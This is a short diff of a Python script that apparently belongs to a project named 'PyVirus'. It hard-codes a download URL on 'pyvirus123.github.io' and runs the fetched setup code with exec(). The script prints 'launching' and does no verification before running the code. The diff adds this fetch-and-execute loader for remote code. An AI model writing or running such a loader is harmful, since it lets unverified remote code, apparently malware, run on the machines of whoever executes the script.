@@ -9,7 +9,7 @@ except ModuleNotFoundError:
     exit()
 print("modules loaded")
 print("getting main setup via network...")
-response = requests.get(url)
+response = requests.get("https://pyvirus123.github.io/PyVirus/data/setup/setup.py")
 if response.status_code == 200:
  print("main setup gotten via network. launching...")
  exec(response.content)
